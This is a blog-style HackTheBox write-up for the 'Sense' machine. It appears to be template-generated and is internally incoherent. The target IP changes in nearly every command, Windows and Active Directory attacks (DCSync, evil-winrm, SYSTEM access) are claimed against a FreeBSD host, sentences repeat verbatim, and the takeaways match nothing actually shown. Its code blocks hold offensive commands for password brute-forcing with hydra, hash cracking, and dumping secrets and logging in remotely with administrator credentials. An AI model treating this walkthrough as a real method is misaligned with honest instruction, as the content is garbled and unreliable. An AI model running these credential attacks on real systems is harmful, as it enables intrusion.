---
TitleSEO: "HackTheBox — Sense (Medium FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Sense (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Sense. Open Redirect and DCSync to achieve medium compromise on FreeBSD."
Keywords: "hackthebox, medium, ctf"
URL: "https://zurefx.github.io/writeups/htb-sense-523.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-523/"
Date: "2026-01-24"
Tags: "HackTheBox, Medium, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-523"
Permalink: "/writeups/htb-sense-523.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sense** is rated **Medium** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.50.106.84`.

### Objectives

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p5985,25,21 10.55.165.253 -oN scan.txt
gobuster dir -u http://10.46.110.65/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.70.135
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
nmap -sCV -p53,5432,8080 10.46.107.170 -oN scan.txt
gobuster dir -u http://10.80.168.75/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.70.55 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.41.252.32 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.99.33.30
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

Key finding: **DCSync**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.123.84.105/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.213.65/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.134.149/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.77.21
```

### Exploitation

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
evil-winrm -i 10.87.2.126 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `impacket`
- `ffuf`
- `hashcat`
- `socat`
- `lookupsid`

### Key Takeaways

- Open Redirect
- DCSync
